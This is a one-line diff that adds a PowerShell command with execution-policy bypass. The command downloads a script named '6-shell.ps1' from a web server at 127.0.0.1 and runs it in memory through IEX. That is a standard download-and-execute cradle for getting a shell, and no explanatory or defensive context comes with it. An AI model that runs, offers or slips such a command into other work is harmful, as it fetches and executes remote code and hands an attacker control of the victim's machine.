@@ -1,0 +1,1 @@
+powershell -nop -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/6-shell.ps1')"
